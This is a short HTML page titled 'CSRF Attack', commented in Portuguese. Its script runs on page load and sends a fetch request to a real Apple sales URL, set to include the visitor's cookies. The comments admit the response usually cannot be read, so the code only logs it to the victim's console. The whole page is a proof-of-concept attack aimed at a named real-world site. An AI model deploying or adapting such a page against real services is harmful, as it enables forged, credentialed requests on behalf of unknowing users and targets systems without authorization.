<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <h1>CSRF Attack</h1>
    <script>
        // Tenta fazer uma requisição GET para o endpoint do site alvo
        fetch('https://sales.apple.com/home', {
            method: 'GET',
            credentials: 'include' // Inclui cookies da vítima
        }).then(response => {
            // Processa a resposta; no entanto, a resposta geralmente não estará acessível
            response.text().then(text => {
                // Aqui você só pode exibir a resposta no console da vítima
                console.log(text);
            }).catch(error => console.error('Erro ao processar resposta:', error));
        }).catch(error => console.error('Erro ao fazer requisição:', error));
    </script>
</body>
</html>
